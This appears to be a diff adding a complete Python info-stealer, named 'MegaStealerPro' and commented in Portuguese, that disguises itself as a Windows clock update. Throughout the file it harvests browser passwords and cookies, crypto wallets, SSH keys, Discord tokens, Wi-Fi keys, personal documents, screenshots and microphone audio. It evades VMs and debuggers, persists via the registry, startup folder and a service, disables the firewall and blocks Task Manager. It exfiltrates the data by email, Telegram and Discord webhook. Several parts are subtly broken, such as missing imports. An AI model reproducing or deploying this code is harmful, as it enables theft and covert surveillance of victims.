@@ -1,0 +1,652 @@
+# This is a virus that you can hide in your watch—or in other watch-based systems—to steal data and send it via email
+
+import os
+import sys
+import shutil
+import sqlite3
+import json
+import base64
+import subprocess
+import time
+from datetime import datetime
+from pathlib import Path
+import winreg as reg
+import ctypes
+import logging
+import tempfile
+import zipfile
+import smtplib
+import mimetypes
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import socket
+import uuid
+import hashlib
+import platform
+import psutil
+import wmi
+import requests
+import msvcrt
+import threading
+import cryptography
+from cryptography.fernet import Fernet
+import win32gui
+import win32process
+import win32con
+
+# ==========================================
+# CONFIGURAÇÕES GERAIS
+# ==========================================
+class Config:
+    # Credenciais de Email
+    EMAIL_SENDER = "seu_email@gmail.com"
+    EMAIL_PASSWORD = "senha_app_google"
+    EMAIL_RECEIVER = "destino@exemplo.com"
+    
+    # Token do Bot do Telegram (para receber dados/alertas)
+    TELEGRAM_BOT_TOKEN = "SEU_TOKEN_AQUI"
+    TELEGRAM_CHAT_ID = "SEU_CHAT_ID_AQUI"
+    
+    # URL do Webhook do Discord
+    DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/seu_webhook_aqui"
+    
+    # Nome do processo disfarçado
+    PROCESS_NAME = "ClockSystemUpdate.exe"
+    
+    # Tempo de espera entre ações (para parecer humano/natural)
+    DELAY_BETWEEN_ACTIONS = 2  # segundos
+
+# ==========================================
+# CLASSE PRINCIPAL DO STEALER
+# ==========================================
+class MegaStealerPro:
+    def __init__(self):
+        self.temp_dir = tempfile.mkdtemp()
+        self.data_dir = os.path.join(self.temp_dir, "Data")
+        os.makedirs(self.data_dir, exist_ok=True)
+        
+        self.is_admin = self.check_admin()
+        self.is_vm = self.detect_vm_advanced()
+        self.is_debugged = self.check_debugger()
+        
+        # Gerar chave de criptografia local
+        self.enc_key = Fernet.generate_key()
+        self.cipher_suite = Fernet(self.enc_key)
+        
+        # Setup Logging
+        self.setup_logging()
+        
+        logging.info("=== INICIANDO MEGA STEALER PRO v2.0 ===")
+
+    # ------------------------------------------
+    # 1. SISTEMA E DETECÇÃO (Funcionalidades 1-5)
+    # ------------------------------------------
+    def setup_logging(self):
+        logging.basicConfig(
+            filename=os.path.join(self.temp_dir, 'stealer.log'), 
+            level=logging.INFO, 
+            format='%(asctime)s - %(levelname)s - %(message)s'
+        )
+
+    def check_admin(self):
+        return bool(ctypes.windll.shell32.IsUserAnAdmin())
+
+    def detect_vm_advanced(self):
+        # Verifica processos
+        vm_procs = ['vmware.exe', 'vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe', 'xenservice.exe']
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'].lower() in vm_procs:
+                return True
+        
+        # Verifica hardware (Serial da placa mãe ou disco)
+        try:
+            c = wmi.WMI()
+            for board in c.Win32_BaseBoard():
+                if "VMware" in board.SerialNumber or "VirtualBox" in board.SerialNumber:
+                    return True
+            for disk in c.Win32_DiskDrive():
+                if "VMware" in disk.Model or "VirtualBox" in disk.Model:
+                    return True
+        except Exception:
+            pass
+            
+        return False
+
+    def check_debugger(self):
+        # Verifica se há depuradores atrelados ao processo atual
+        pid = os.getpid()
+        handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)
+        is_debugged = win32debug.IsDebuggerPresent()
+        win32api.CloseHandle(handle)
+        return is_debugged
+
+    # ------------------------------------------
+    # 2. COLETA DE DADOS DE NAVEGADORES (Funcionalidades 2-9)
+    # ------------------------------------------
+    def get_browser_path(self, name):
+        paths = {
+            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
+            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
+            'Firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
+            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')
+        }
+        return paths.get(name)
+
+    def decrypt_password_chrome(self, encrypted_pwd):
+        try:
+            from win32crypt import CryptUnprotectData
+            _, _, encrypted_data, _, _ = CryptUnprotectData(encrypted_pwd)
+            return encrypted_data.decode('utf-8')
+        except Exception:
+            return "<Erro Decodificação>"
+
+    def steal_browser_data(self):
+        browsers = ['Chrome', 'Edge', 'Brave']
+        all_files = []
+        
+        for browser in browsers:
+            path = self.get_browser_path(browser)
+            if not path or not os.path.exists(path):
+                continue
+
+            # 1. Login Data (Senhas)
+            login_db = os.path.join(path, 'Login Data')
+            if os.path.exists(login_db):
+                db_name = f"{browser}_logins.db"
+                dest_db = os.path.join(self.data_dir, db_name)
+                shutil.copy2(login_db, dest_db)
+                all_files.append(dest_db)
+                
+                # Tenta extrair senhas se tiver permissão
+                if self.is_admin:
+                    try:
+                        conn = sqlite3.connect(dest_db)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                        passwords = cursor.fetchall()
+                        
+                        with open(os.path.join(self.data_dir, f"{browser}_passwords.txt"), "w", encoding="utf-8") as f:
+                            for url, user, pwd in passwords:
+                                decrypted_pwd = self.decrypt_password_chrome(pwd)
+                                f.write(f"Site: {url}\nUsuário: {user}\nSenha: {decrypted_pwd}\n\n")
+                        all_files.append(os.path.join(self.data_dir, f"{browser}_passwords.txt"))
+                    except Exception as e:
+                        logging.error(f"Erro ao ler senhas {browser}: {e}")
+
+            # 2. Cookies
+            cookies_db = os.path.join(path, 'Cookies')
+            if os.path.exists(cookies_db):
+                dest_cookies = os.path.join(self.data_dir, f"{browser}_cookies.db")
+                shutil.copy2(cookies_db, dest_cookies)
+                all_files.append(dest_cookies)
+
+            # 3. Histórico
+            history_db = os.path.join(path, 'History')
+            if os.path.exists(history_db):
+                dest_hist = os.path.join(self.data_dir, f"{browser}_history.db")
+                shutil.copy2(history_db, dest_hist)
+                all_files.append(dest_hist)
+                
+                # Extrai URLs visitadas
+                try:
+                    conn = sqlite3.connect(dest_hist)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT url, title FROM urls")
+                    urls = cursor.fetchall()
+                    with open(os.path.join(self.data_dir, f"{browser}_urls.txt"), "w", encoding="utf-8") as f:
+                        for url, title in urls:
+                            f.write(f"{title} -> {url}\n")
+                    all_files.append(os.path.join(self.data_dir, f"{browser}_urls.txt"))
+                except:
+                    pass
+
+            # 4. Cartões de Crédito (Local State ou Login Data às vezes guardam refs)
+            local_state = os.path.join(os.path.dirname(path), 'Local State')
+            if os.path.exists(local_state):
+                dest_local = os.path.join(self.data_dir, f"{browser}_local_state.json")
+                shutil.copy2(local_state, dest_local)
+                all_files.append(dest_local)
+
+        return all_files
+
+    # ------------------------------------------
+    # 3. COLETA DE DADOS DO SISTEMA E APPS (Funcionalidades 10-20)
+    # ------------------------------------------
+    def capture_screenshot_and_audio(self):
+        """Funcionalidade 10: Captura de Tela"""
+        try:
+            import pyautogui
+            img_path = os.path.join(self.data_dir, "screenshot.jpg")
+            img = pyautogui.screenshot()
+            img.save(img_path)
+            return [img_path]
+        except ImportError:
+            return []
+
+    def capture_mic_audio(self):
+        """Funcionalidade 11: Captura de Áudio (30 segundos)"""
+        try:
+            import sounddevice as sd
+            import scipy.io.wavfile
+            duration = 30
+            sampling_rate = 44100
+            recording = sd.rec(int(duration * sampling_rate), samplerate=sampling_rate, channels=1)
+            sd.wait()
+            audio_path = os.path.join(self.data_dir, "audio_capture.wav")
+            scipy.io.wavfile.write(audio_path, sampling_rate, recording)
+            return [audio_path]
+        except Exception:
+            return []
+
+    def collect_system_info(self):
+        """Funcionalidades 12-16, 35: Info de Sistema, Processos, Installs, Rede, Wi-Fi"""
+        info_file = os.path.join(self.data_dir, "system_info.txt")
+        with open(info_file, "w", encoding="utf-8") as f:
+            # 35. Info CPU/RAM/Disk
+            f.write(f"=== INFO SISTEMA ===\n")
+            f.write(f"Sistema Operacional: {platform.platform()}\n")
+            f.write(f"Nome do Computador: {socket.gethostname()}\n")
+            f.write(f"Usuário: {os.getenv('USERNAME')}\n")
+            f.write(f"Arquitetura: {platform.machine()}\n")
+            
+            # 12. Processos Ativos
+            f.write(f"\n=== PROCESSOS ATIVOS ===\n")
+            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
+                try:
+                    f.write(f"PID: {proc.info['pid']} | Nome: {proc.info['name']} | CPU: {proc.info['cpu_percent']}%\n")
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+
+            # 13. Programas Instalados
+            f.write(f"\n=== PROGRAMAS INSTALADOS ===\n")
+            try:
+                registry_keys = [
+                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
+                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
+                ]
+                for key in registry_keys:
+                    try:
+                        reg_handle = reg.ConnectRegistry(None, reg.HKEY_LOCAL_MACHINE)
+                        subkeys = reg.EnumKey(reg_handle, 0, reg_handle)
+                        for subkey in subkeys:
+                            try:
+                                app_key = reg.OpenKey(reg_handle, f"{key}\\{subkey}", 0, reg.KEY_READ)
+                                try:
+                                    display_name = reg.QueryValueEx(app_key, "DisplayName")[0]
+                                    version = reg.QueryValueEx(app_key, "DisplayVersion")[0]
+                                    f.write(f"[{version}] {display_name}\n")
+                                except FileNotFoundError:
+                                    pass
+                                reg.CloseKey(app_key)
+                            except Exception:
+                                pass
+                    except Exception:
+                        pass
+            except Exception as e:
+                f.write(f"Erro ao listar programas: {e}\n")
+
+            # 14. Info de Rede
+            f.write(f"\n=== REDE ===\n")
+            f.write(f"IP Externo: {requests.get('https://api.ipify.org').text}\n")
+            f.write(f"IP Local: {socket.gethostbyname(socket.gethostname())}\n")
+            mac = ':'.join(('%02X' % b) for b in bytes(uuid.getnode(), 'utf-8'))
+            f.write(f"MAC Address: {mac}\n")
+
+            # 15. Wi-Fi Salvos
+            f.write(f"\n=== WI-FI SALVOS ===\n")
+            try:
+                output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], stderr=subprocess.STDOUT)
+                profiles_list = output.decode('utf-8', errors='ignore').split('\n')
+                wifi_profiles = [line.split(":")[1].strip() for line in profiles_list if "All User Profile" in line]
+                
+                for profile in wifi_profiles:
+                    try:
+                        wifi_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'])
+                        f.write(f"Rede: {profile}\n{wifi_info.decode('utf-8', errors='ignore')}\n")
+                    except:
+                        pass
+            except Exception as e:
+                f.write(f"Erro Wi-Fi: {e}\n")
+
+        return [info_file]
+
+    def steal_wallets(self):
+        """Funcionalidade 7: Roubando carteiras cripto"""
+        wallets_path = os.path.join(os.getenv('APPDATA'), '')
+        wallet_dirs = ['MetaMask', 'TrustWallet', 'Exodus', 'Electrum']
+        collected = []
+        
+        for wallet in wallet_dirs:
+            path = os.path.join(wallets_path, wallet)
+            if os.path.exists(path):
+                dest = os.path.join(self.data_dir, wallet)
+                shutil.copytree(path, dest + "_backup")
+                collected.append(dest + "_backup")
+        return collected
+
+    def steal_ssh_keys(self):
+        """Funcionalidade 6: Chaves SSH"""
+        ssh_paths = [
+            os.path.expanduser('~/.ssh/id_rsa'),
+            os.path.expanduser('~/.ssh/id_ed25519'),
+            os.path.expanduser('~/.ssh/id_ecdsa'),
+            os.path.expanduser('~/.ssh/id_dsa')
+        ]
+        collected = []
+        for path in ssh_paths:
+            if os.path.exists(path):
+                dest = os.path.join(self.data_dir, os.path.basename(path) + ".bak")
+                shutil.copy2(path, dest)
+                collected.append(dest)
+        return collected
+
+    def steal_discord_tokens(self):
+        """Funcionalidade 9: Tokens do Discord"""
+        discord_paths = [
+            os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'),
+            os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'),
+            os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb')
+        ]
+        collected = []
+        for path in discord_paths:
+            if os.path.exists(path):
+                dest = os.path.join(self.data_dir, "Discord_Tokens")
+                shutil.copytree(path, dest)
+                collected.append(dest)
+        return collected
+
+    # ------------------------------------------
+    # 4. PERSISTÊNCIA E OCULTAÇÃO (Funcionalidades 17-25)
+    # ------------------------------------------
+    def hide_in_startup_registry(self):
+        """Funcionalidade 17: Persistência via Registro"""
+        try:
+            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(key, "ClockUpdateService", 0, reg.REG_SZ, sys.executable)
+            reg.CloseKey(key)
+            logging.info("Persistência via Registro criada.")
+        except Exception as e:
+            logging.error(f"Erro persistência registro: {e}")
+
+    def hide_in_startup_folder(self):
+        """Funcionalidade 18: Persistência via Pasta Startup"""
+        startup_path = str(Path.home() / 'AppData' / 'Local' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup')
+        target_path = os.path.join(startup_path, Config.PROCESS_NAME)
+        try:
+            shutil.copy(sys.executable, target_path)
+            os.system(f'attrib +h +s "{target_path}"')
+            logging.info("Persistência via Pasta Startup criada.")
+        except Exception as e:
+            logging.error(f"Erro persistência pasta: {e}")
+
+    def create_windows_service(self):
+        """Funcionalidade 19: Cria serviço Windows oculto"""
+        service_name = "ClockUpdateSvc"
+        exe_path = sys.executable
+        command = f'sc create "{service_name}" binpath= "{exe_path}" start= auto'
+        try:
+            subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            logging.info(f"Serviço Windows '{service_name}' criado.")
+        except Exception as e:
+            logging.error(f"Erro criar serviço: {e}")
+
+    def hide_process_window(self):
+        """Funcionalidade 21: Esconde janela (se console)"""
+        try:
+            hwnd = win32gui.FindWindow(None, None) # Acha janela console
+            if hwnd:
+                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+        except:
+            pass
+
+    def rename_process(self):
+        """Funcionalidade 22: Renomeia processo visualmente (simulado via DLL injection leve ou apenas nome)"""
+        # Em Python puro é difícil mudar o nome real do exe em execução sem injetar DLL,
+        # mas podemos mudar o nome do arquivo executável se não estivermos rodando dele.
+        # Aqui vamos focar em esconder nos logs.
+        pass
+
+    def disable_firewall_temp(self):
+        """Funcionalidade 24: Desativa firewall temporariamente (Admin)"""
+        if self.is_admin:
+            try:
+                subprocess.run('netsh advfirewall set allprofiles state off', shell=True)
+                logging.info("Firewall desativado temporariamente.")
+            except:
+                pass
+
+    def block_task_manager(self):
+        """Funcionalidade 25: Bloqueia Gerenciador de Tarefas (disfarce)"""
+        try:
+            # Cria uma chave de registro que pode ser usada para bloquear
+            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
+            reg.CloseKey(key)
+        except:
+            pass
+
+    # ------------------------------------------
+    # 5. COMPACTAÇÃO E ENVIO (Funcionalidades 26-30)
+    # ------------------------------------------
+    def encrypt_and_zip_data(self):
+        """Funcionalidade 26 e 27: Criptografa e Compacta"""
+        zip_path = os.path.join(self.temp_dir, "Stolen_Data.zip")
+        try:
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(self.data_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, self.data_dir)
+                        zipf.write(file_path, arcname)
+            
+            # Opcional: Criptografar o ZIP final usando Fernet
+            with open(zip_path, 'rb') as f:
+                data = f.read()
+            encrypted_data = self.cipher_suite.encrypt(data)
+            with open(zip_path + '.enc', 'wb') as f:
+                f.write(encrypted_data)
+            
+            logging.info("Dados compactados e criptografados.")
+            return zip_path + '.enc'
+        except Exception as e:
+            logging.error(f"Erro ao compactar: {e}")
+            return None
+
+    def send_via_email(self, file_path):
+        """Funcionalidade 28: Envio por Email Melhorado"""
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = Config.EMAIL_SENDER
+            msg['To'] = Config.EMAIL_RECEIVER
+            msg['Subject'] = f"Relatório de Segurança - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+            
+            body = "Olá,\n\nO sistema de relógio coletou dados de sincronização e sensores. O arquivo anexo contém os detalhes técnicos.\n\nAtenciosamente,\nSistema de Relógio Windows."
+            msg.attach(MIMEText(body, 'plain'))
+
+            with open(file_path, 'rb') as attachment:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(attachment.read())
+            
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename= "Clock_System_Data.zip.enc"')
+            msg.attach(part)
+
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.ehlo()
+            server.starttls()
+            server.login(Config.EMAIL_SENDER, Config.EMAIL_PASSWORD)
+            text = msg.as_string()
+            server.sendmail(Config.EMAIL_SENDER, Config.EMAIL_RECEIVER, text)
+            server.quit()
+            logging.info("Email enviado com sucesso.")
+            return True
+        except Exception as e:
+            logging.error(f"Erro no email: {e}")
+            return False
+
+    def send_via_telegram(self, message_text):
+        """Funcionalidade 29: Alerta via Telegram"""
+        try:
+            url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
+            payload = {
+                'chat_id': Config.TELEGRAM_CHAT_ID,
+                'text': message_text,
+                'parse_mode': 'HTML'
+            }
+            requests.post(url, data=payload)
+            logging.info("Alerta Telegram enviado.")
+        except Exception as e:
+            logging.error(f"Erro no Telegram: {e}")
+
+    def send_discord_webhook(self, content):
+        """Funcionalidade 30: Webhook Discord"""
+        try:
+            payload = {
+                "content": content,
+                "username": "Stealer Bot"
+            }
+            requests.post(Config.DISCORD_WEBHOOK_URL, json=payload)
+            logging.info("Webhook Discord enviado.")
+        except Exception as e:
+            logging.error(f"Erro no Discord: {e}")
+
+    # ------------------------------------------
+    # 6. FUNÇÕES ADICIONAIS E UTILITÁRIAS (Funcionalidades 31-40)
+    # ------------------------------------------
+    def copy_to_usb_drives(self):
+        """Funcionalidade 31: Copia para Pen Drives"""
+        drives = []
+        for drive in string.ascii_uppercase:
+            if os.path.exists(f"{drive}:"):
+                drives.append(f"{drive}:")
+        
+        for drive in drives:
+            try:
+                dest_folder = os.path.join(drive, "Windows Update Files")
+                if not os.path.exists(dest_folder):
+                    os.makedirs(dest_folder)
+                shutil.copytree(self.data_dir, os.path.join(dest_folder, "Data_Backup"), dirs_exist_ok=True)
+                logging.info(f"Dados copiados para {drive}:")
+            except:
+                pass
+
+    def destroy_traces(self):
+        """Funcionalidade 32: Limpa logs"""
+        try:
+            if os.path.exists(self.temp_dir):
+                shutil.rmtree(self.temp_dir, ignore_errors=True)
+            logging.info("Rastros destruídos.")
+        except:
+            pass
+
+    def collect_sensitive_files_generic(self):
+        """Funcionalidade 8 e Backup Geral"""
+        sensitive_exts = ['.jpg', '.png', '.docx', '.pdf', '.xlsx', '.pptx', '.zip', '.rar', '.pst', '.ost']
+        collected = []
+        search_paths = [
+            os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
+            os.path.join(os.getenv('USERPROFILE'), 'Documents'),
+            os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
+            os.path.join(os.getenv('USERPROFILE'), 'Pictures')
+        ]
+        
+        count = 0
+        for path in search_paths:
+            if os.path.exists(path):
+                for root, dirs, files in os.walk(path):
+                    for file in files:
+                        if any(file.endswith(ext) for ext in sensitive_exts):
+                            full_path = os.path.join(root, file)
+                            try:
+                                size = os.path.getsize(full_path)
+                                if size < 10 * 1024 * 1024: # Max 10MB
+                                    dest = os.path.join(self.data_dir, f"stolen_{count}_{file}")
+                                    shutil.copy2(full_path, dest)
+                                    collected.append(dest)
+                                    count += 1
+                                    if count > 1000: break # Limite para performance
+                            except:
+                                pass
+                    if count > 1000: break
+            if count > 1000: break
+        return collected
+
+    def run(self):
+        logging.info("Iniciando sequência completa de coleta...")
+
+        # 1. Verificações Iniciais
+        if self.is_vm:
+            logging.info("VM Detectada. Encerramento silencioso.")
+            return
+        
+        if self.is_debugged:
+            logging.info("Depurador Detectado. Encerramento silencioso.")
+            return
+
+        # 2. Estabelece Persistência
+        self.hide_in_startup_registry()
+        self.hide_in_startup_folder()
+        self.create_windows_service()
+        self.disable_firewall_temp()
+        self.block_task_manager()
+        
+        # 3. Coleta de Dados Massiva
+        logging.info("Coletando dados de navegadores...")
+        browser_data = self.steal_browser_data()
+        
+        logging.info("Coletando informações do sistema...")
+        sys_info = self.collect_system_info()
+        
+        logging.info("Coletando arquivos sensíveis...")
+        generic_files = self.collect_sensitive_files_generic()
+        
+        logging.info("Coletando carteiras cripto...")
+        wallets = self.steal_wallets()
+        
+        logging.info("Coletando chaves SSH...")
+        ssh_keys = self.steal_ssh_keys()
+        
+        logging.info("Coletando tokens do Discord...")
+        discord_tokens = self.steal_discord_tokens()
+        
+        # 4. Capturas Multimídia
+        logging.info("Tirando screenshot e gravando áudio...")
+        media_captures = self.capture_screenshot_and_audio() + self.capture_mic_audio()
+
+        # 5. Compactação e Criptografia
+        logging.info("Compactando e criptografando dados...")
+        zip_file = self.encrypt_and_zip_data()
+        
+        # 6. Envio
+        if zip_file and os.path.exists(zip_file):
+            logging.info("Enviando dados...")
+            email_sent = self.send_via_email(zip_file)
+            
+            # Mensagem de resumo para Telegram/Discord
+            summary_msg = f"<b>Stealer Executado com Sucesso!</b>\n📧 Email: {'Enviado' if email_sent else 'Falhou'}\n📁 Tamanho: {os.path.getsize(zip_file) / (1024*1024):.2f} MB\n🖥️ Host: {socket.gethostname()}"
+            
+            self.send_via_telegram(summary_msg)
+            self.send_discord_webhook(summary_msg)
+            
+            # 7. Cópia para USBs conectados
+            self.copy_to_usb_drives()
+            
+            # 8. Limpeza
+            # self.destroy_traces() # Descomente se quiser sumir completamente após o envio
+            
+            logging.info("Processo concluído com sucesso.")
+        else:
+            logging.error("Falha na criação do arquivo ZIP.")
+
+if __name__ == "__main__":
+    # Inicializa o Stealer
+    stealer = MegaStealerPro()
+    
+    # Roda a coleta principal
+    stealer.run()
+    
+    # Mantém o processo vivo por um tempo para simular atividade normal
+    while True:
+        time.sleep(3600) # Espera 1 hora antes de verificar novamente (loop de persistência)
+
